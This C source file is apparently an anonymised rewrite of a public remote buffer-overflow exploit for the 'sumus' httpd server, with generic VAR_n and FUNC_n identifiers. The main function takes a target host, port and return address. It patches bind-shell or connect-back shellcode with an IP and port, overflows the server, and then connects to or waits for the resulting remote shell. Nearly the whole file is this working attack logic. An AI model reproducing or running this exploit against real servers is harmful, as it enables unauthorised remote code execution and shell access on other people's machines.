
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct hostent {scalar_t__ h_addr; } ;
typedef int s ;
typedef int in_addr_t ;
struct TYPE_2__ {int port; int sport; int addr; int loct_kk; char* host; int new_kk; } ;


 int VAR_0 ;
 unsigned char VAR_1 ;
 void* VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 void* FUNC_0 (int ) ;
 int FUNC_1 (int ) ;
 struct hostent* FUNC_2 (int ) ;
 int FUNC_3 (int,char**,char*) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int) ;
 int FUNC_6 (char*,int) ;
 int FUNC_7 (int ) ;
 int FUNC_8 (char*,char*,int) ;
 int VAR_8 ;
 int FUNC_9 (char*,int) ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int) ;
 int FUNC_12 (int ,char*,int*) ;
 scalar_t__ FUNC_13 (int ) ;
 unsigned int FUNC_14 (int*) ;
 int FUNC_15 (char*,int) ;
 TYPE_1__ VAR_9 ;
 int FUNC_16 (char*) ;
 int* VAR_10 ;
 int* VAR_11 ;
 int* VAR_12 ;

int FUNC_17(int VAR_13,char **VAR_14){
 unsigned char VAR_15=0;
 signed int VAR_16=0,VAR_17=0;
 unsigned int VAR_18=0;
 struct hostent *VAR_19;
 in_addr_t VAR_20=0;
 FUNC_10("[*] sumus[v0.2.2]: (httpd) remote buffer overflow explo"
 "it.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
 VAR_9.port=VAR_3;
 VAR_9.sport=VAR_5;
 VAR_9.addr=VAR_4;
 VAR_9.loct_kk=VAR_2;
 while((VAR_16=FUNC_3(VAR_13,VAR_14,"h:p:s:c:r:l:n:"))!=VAR_7){
  switch(VAR_16){
   case 'h':
    if(!VAR_9.host&&!(VAR_9.host=(char *)FUNC_13(VAR_8)))
     FUNC_9("main(): allocating memory failed",1);
    break;
   case 'p':
    VAR_9.port=FUNC_0(VAR_8);
    break;
   case 's':
    VAR_9.sport=FUNC_0(VAR_8);
    break;
   case 'c':
    if((VAR_20=FUNC_7(VAR_8))){
     if((VAR_19=FUNC_2(VAR_8)))
      FUNC_8((char *)&VAR_20,(char *)VAR_19->h_addr,sizeof(VAR_20));
     if(VAR_20==-1)VAR_20=0;
     if(!VAR_20)FUNC_9("invalid host/ip. (-c option)",0);
    }
    break;
   case 'r':
    FUNC_12(VAR_8,"%x",&VAR_9.addr);
    break;
   case 'l':
    VAR_9.loct_kk=FUNC_0(VAR_8);
    break;
   case 'n':
    VAR_15=FUNC_0(VAR_8);
    break;
   default:
    FUNC_16(VAR_14[0]);
    break;
  }
 }
 if(!VAR_9.host)FUNC_16(VAR_14[0]);
 if(VAR_9.loct_kk<0||VAR_9.loct_kk>VAR_0)VAR_9.loct_kk=VAR_2;

 if(!VAR_20){
  VAR_18=FUNC_14(VAR_10);
  VAR_10[20]=(VAR_9.sport&0xff00)>>8;
  VAR_10[21]=(VAR_9.sport&0x00ff);
  VAR_12=VAR_10;
 }

 else{
  VAR_18=FUNC_14(VAR_11);
  VAR_11[33]=(VAR_20&0x000000ff);
  VAR_11[34]=(VAR_20&0x0000ff00)>>8;
  VAR_11[35]=(VAR_20&0x00ff0000)>>16;
  VAR_11[36]=(VAR_20&0xff000000)>>24;
  VAR_11[39]=(VAR_9.sport&0xff00)>>8;
  VAR_11[40]=(VAR_9.sport&0x00ff);
  VAR_12=VAR_11;
 }
 if(VAR_18!=FUNC_14(VAR_12))
  FUNC_9("ip(-c option) and/or port(-s option) appear to contain a "
  "null-byte, try again.",1);
 VAR_9.new_kk=(VAR_9.loct_kk+(VAR_15?VAR_15:VAR_1));
 if(!VAR_9.new_kk)
  FUNC_9("ip(-l/-n option) made the overwritten \"kk\" integer a "
  "null-byte.",1);
 FUNC_10("[*] target\t\t\t: %s:%d\n",VAR_9.host,VAR_9.port);
 FUNC_10("[*] shellcode type\t\t: %s(port=%d)\n",
 (VAR_20?"connect-back":"bindshell"),VAR_9.sport);
 FUNC_10("[*] return address($eip)\t: 0x%.8x\n",VAR_9.addr);
 FUNC_10("[*] overwritten \"kk\" int value\t: "
 "%u(0x%.2x)\n",VAR_9.new_kk,VAR_9.new_kk);
 FUNC_10("[*] overflow size\t\t: %u(tot=%u) byte(s)\n",
 VAR_9.loct_kk,VAR_0);
 FUNC_10("[*] egg size\t\t\t: %u byte(s)\n\n",VAR_6);
 if(VAR_20){
  VAR_17=FUNC_5(VAR_9.sport);
  FUNC_15(VAR_9.host,VAR_9.port);
  VAR_17=FUNC_4(VAR_17);
 }
 else{
  FUNC_15(VAR_9.host,VAR_9.port);
  VAR_17=FUNC_6(VAR_9.host,VAR_9.sport);
 }
 if(VAR_17>0)FUNC_11(VAR_17);
 FUNC_1(0);
}
